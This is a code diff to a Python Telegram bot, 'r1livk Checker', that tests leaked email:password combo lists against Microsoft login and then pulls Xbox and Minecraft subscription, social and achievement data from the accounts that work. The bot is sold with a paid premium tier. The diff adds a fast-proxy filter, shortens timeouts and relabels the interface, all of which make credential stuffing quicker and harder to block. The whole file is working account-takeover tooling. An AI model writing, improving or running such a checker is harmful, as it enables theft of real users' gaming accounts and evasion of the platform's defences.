@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Checker ⚡ - Telegram Bot (Heavy Gaming Edition - Clean English)
+r1livk Checker ⚡ - Telegram Bot (Heavy Gaming Edition - Fast Proxies Filter)
 """
 
 import os
@@ -140,10 +140,13 @@ def test_single_proxy(proxy):
     }
     try:
         start_t = time.time()
-        resp = curequests.get("https://login.live.com", proxies=proxies, timeout=5, impersonate="chrome120")
+        # فحص سريع على موقع مايكروسوفت بمهلة قصيرة جداً (3 ثواني)
+        resp = curequests.get("https://login.live.com", proxies=proxies, timeout=3, impersonate="chrome120")
         if resp.status_code == 200:
             ping = int((time.time() - start_t) * 1000)
-            return True, ping
+            # شرط السرعة: بنقبل فقط البروكسي اللي البينغ تبعه أقل من 1500 ميلي ثانية (1.5 ثانية)
+            if ping <= 1500:
+                return True, ping
     except:
         pass
     return False, 0
@@ -161,7 +164,7 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
             "RelyingParty": "https://displaycatalog.mp.microsoft.com",
             "TokenType": "JWT"
         }
-        xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=10)
+        xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=8)
         
         if xsts_resp.status_code == 200:
             xsts_token = xsts_resp.json()['Token']
@@ -173,7 +176,7 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
             
             sub_headers = headers.copy()
             sub_headers["x-xbl-contract-version"] = "2"
-            sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=sub_headers, proxies=proxy_dict, impersonate="chrome120", timeout=8)
+            sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=sub_headers, proxies=proxy_dict, impersonate="chrome120", timeout=6)
             if sub_req.status_code == 200:
                 sub_data = sub_req.json()
                 for sub in sub_data.get("items", []):
@@ -183,7 +186,7 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
                         break
 
             xuid = None
-            people_resp = session.get("https://peoplehub.xboxlive.com/users/me/people/social/summary", headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=8)
+            people_resp = session.get("https://peoplehub.xboxlive.com/users/me/people/social/summary", headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=6)
             if people_resp.status_code == 200:
                 p_data = people_resp.json()
                 if "profileUsers" in p_data and len(p_data["profileUsers"]) > 0:
@@ -191,7 +194,7 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
 
             if xuid:
                 history_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
-                history_resp = session.get(history_url, headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=8)
+                history_resp = session.get(history_url, headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=6)
                 if history_resp.status_code == 200:
                     history_data = history_resp.json()
                     counter = 1
@@ -409,7 +412,7 @@ def show_main_menu(message):
 
     markup = types.InlineKeyboardMarkup(row_width=1)
     btn_start = types.InlineKeyboardButton("⚡ Start Heavy Gaming Checker", callback_data="start_checker")
-    btn_proxy = types.InlineKeyboardButton("🌐 Upload & Filter Proxies", callback_data="upload_proxies_menu")
+    btn_proxy = types.InlineKeyboardButton("🚀 Upload & Fast-Filter Proxies", callback_data="upload_proxies_menu")
     btn_top = types.InlineKeyboardButton("🏆 Leaderboard (Top Users)", callback_data="show_leaderboard")
     btn_premium = types.InlineKeyboardButton("💎 Buy Premium ($15/Month)", callback_data="buy_premium")
     btn_account = types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
@@ -423,7 +426,7 @@ def show_main_menu(message):
         status_text = f"👤 Free ({used}/2500 lines today)"
 
     p_count = len(user_proxies.get(chat_id, []))
-    proxy_status = f"🌐 Active Proxies: {p_count}" if p_count > 0 else "🌐 Proxies: Direct"
+    proxy_status = f"🚀 Fast Proxies: {p_count}" if p_count > 0 else "🌐 Proxies: Direct"
 
     text = (
         "⚡ **r1livk Checker - Heavy Gaming Edition** ⚡\n\n"
@@ -466,7 +469,7 @@ def callback_query(call):
         p_count = len(user_proxies.get(chat_id, []))
         text = (
             "🎮 **Heavy Gaming Mode (Direct & Fast)**\n\n"
-            f"Loaded Proxies: {p_count}\n\n"
+            f"Loaded Fast Proxies: {p_count}\n\n"
             "Send your combo file in `.txt` format (`email:password`)"
         )
         bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
@@ -478,8 +481,8 @@ def callback_query(call):
         markup.add(btn_cancel)
 
         text = (
-            "🌐 **Live Proxy Filter**\n\n"
-            "Send your `.txt` file containing proxies (`IP:PORT`). The bot will filter out dead ones automatically."
+            "🚀 **Fast Proxy Filter (High-Speed Only)**\n\n"
+            "Send your `.txt` file containing proxies (`IP:PORT`). The bot will filter out dead ones AND keep only **high-speed** proxies (Ping < 1.5s)."
         )
         bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
     
@@ -526,10 +529,10 @@ def callback_query(call):
         today = str(date.today())
         p_count = len(user_proxies.get(chat_id, []))
         if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
-            bot.answer_callback_query(call.id, f"Status: Premium / Owner\nActive Proxies: {p_count}", show_alert=True)
+            bot.answer_callback_query(call.id, f"Status: Premium / Owner\nFast Proxies: {p_count}", show_alert=True)
         else:
             used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
-            bot.answer_callback_query(call.id, f"Status: Free ({used}/2500 lines)\nActive Proxies: {p_count}", show_alert=True)
+            bot.answer_callback_query(call.id, f"Status: Free ({used}/2500 lines)\nFast Proxies: {p_count}", show_alert=True)
 
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
@@ -559,7 +562,7 @@ def handle_docs(message):
                 return
 
             total_proxies = len(raw_proxies)
-            msg = bot.reply_to(message, f"🔄 Initializing Proxy Filter... Total: {total_proxies} ⏳")
+            msg = bot.reply_to(message, f"🚀 Initializing Fast Proxy Filter... Total: {total_proxies} ⏳")
             
             working_proxies = []
             tested_count = 0
@@ -573,8 +576,8 @@ def handle_docs(message):
                     if is_working:
                         working_proxies.append(proxy)
 
-            # تشغيل الفلترة عبر ThreadPoolExecutor وتحديث الرسالة لحظياً
-            with ThreadPoolExecutor(max_workers=25) as executor:
+            # تشغيل الفلترة بثريدز عالية عشان يخلص بسرعة ويبقي فقط السريع
+            with ThreadPoolExecutor(max_workers=30) as executor:
                 futures = [executor.submit(proxy_worker, proxy) for proxy in raw_proxies]
                 
                 while any(not f.done() for f in futures):
@@ -584,11 +587,11 @@ def handle_docs(message):
                     
                     progress_pct = (curr_tested / total_proxies) * 100
                     live_proxy_text = (
-                        f"🌐 **Filtering Proxies (Live)...**\n\n"
+                        f"🚀 **Filtering Fast Proxies (Live)...**\n\n"
                         f"📊 Total Proxies: {total_proxies}\n"
                         f"🔍 Tested: {curr_tested} / {total_proxies} ({progress_pct:.1f}%)\n"
-                        f"🟢 Live / Working: {curr_live}\n"
-                        f"🔴 Dead / Failed: {curr_tested - curr_live}"
+                        f"🟢 Fast & Working: {curr_live}\n"
+                        f"🔴 Dead / Slow: {curr_tested - curr_live}"
                     )
                     try:
                         bot.edit_message_text(live_proxy_text, chat_id=chat_id, message_id=msg.message_id, parse_mode="Markdown")
@@ -602,15 +605,15 @@ def handle_docs(message):
             if os.path.exists(local_path): os.remove(local_path)
 
             markup = types.InlineKeyboardMarkup()
-            btn_start = types.InlineKeyboardButton("⚡ Start Heavy Scan", callback_data="start_checker")
+            btn_start = types.InlineKeyboardButton("⚡ Start Fast Heavy Scan", callback_data="start_checker")
             btn_menu = types.InlineKeyboardButton("🏠 Main Menu", callback_data="back_to_menu")
             markup.add(btn_start, btn_menu)
 
             bot.edit_message_text(
-                f"✅ **Proxies Filtered Successfully!**\n\n"
+                f"✅ **Fast Proxies Filtered Successfully!**\n\n"
                 f"📊 Total Tested: `{total_proxies}`\n"
-                f"🟢 Working (Clean): `{len(working_proxies)}`\n"
-                f"🔴 Dead: `{total_proxies - len(working_proxies)}`",
+                f"🟢 Fast & Working: `{len(working_proxies)}`\n"
+                f"🔴 Dead / Slow Dropped: `{total_proxies - len(working_proxies)}`",
                 chat_id=chat_id,
                 message_id=msg.message_id,
                 parse_mode="Markdown",
@@ -628,7 +631,7 @@ def handle_docs(message):
             return
 
         lines = lines[:lines_to_process_count]
-        bot.reply_to(message, f"📥 File received. Initializing Heavy Gaming Scan for {len(lines)} lines...")
+        bot.reply_to(message, f"📥 File received. Initializing Fast Heavy Gaming Scan for {len(lines)} lines...")
         active_scans[chat_id] = True
         
         username = message.from_user.username or message.from_user.first_name
@@ -649,7 +652,7 @@ def process_checker(chat_id, filepath, lines, username):
     xbox_hits = 0
 
     timestamp_str = time.strftime("%Y%m%d_%H%M%S")
-    output_filename = f"r1livk_HeavyHits_{timestamp_str}.txt"
+    output_filename = f"r1livk_FastHeavyHits_{timestamp_str}.txt"
     start_time = time.time()
 
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -658,7 +661,7 @@ def process_checker(chat_id, filepath, lines, username):
     markup.add(btn_stop, btn_back)
 
     initial_status_text = (
-        f"🔥 **HEAVY GAMING SCAN STATS**\n\n"
+        f"🔥 **FAST HEAVY SCAN STATS**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Checked: 0\n"
         f"🔒 2FA: 0\n"
@@ -723,7 +726,7 @@ def process_checker(chat_id, filepath, lines, username):
                 pct = (curr_checked / total) * 100 if total > 0 else 0
 
                 live_text = (
-                    f"🔥 **HEAVY GAMING SCAN (Live)**\n\n"
+                    f"🔥 **FAST HEAVY SCAN (Live)**\n\n"
                     f"📊 Total: {total}\n"
                     f"✅ Checked: {curr_checked}\n"
                     f"🔒 2FA: {curr_tfa}\n"
@@ -751,7 +754,7 @@ def process_checker(chat_id, filepath, lines, username):
     t_mins, t_secs = divmod(elapsed_total, 60)
 
     completion_text = (
-        f"✅ **HEAVY SCAN FINISHED!**\n\n"
+        f"✅ **FAST HEAVY SCAN FINISHED!**\n\n"
         f"📊 Checked: {checked}\n"
         f"🎯 Heavy Hits: {hits}\n"
         f"  • Minecraft: {mc_hits}\n"
@@ -766,7 +769,7 @@ def process_checker(chat_id, filepath, lines, username):
 
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as f:
-            bot.send_document(chat_id, f, caption=f"🎯 **r1livk Heavy Hits ({hits} Hits)**")
+            bot.send_document(chat_id, f, caption=f"🎯 **r1livk Fast Heavy Hits ({hits} Hits)**")
         try:
             os.remove(output_filename)
         except:
@@ -776,5 +779,5 @@ def process_checker(chat_id, filepath, lines, username):
         os.remove(filepath)
 
 if __name__ == "__main__":
-    print("r1livk Checker Bot (Heavy Edition) is running...")
+    print("r1livk Checker Bot (Fast Proxies Edition) is running...")
     bot.infinity_polling()
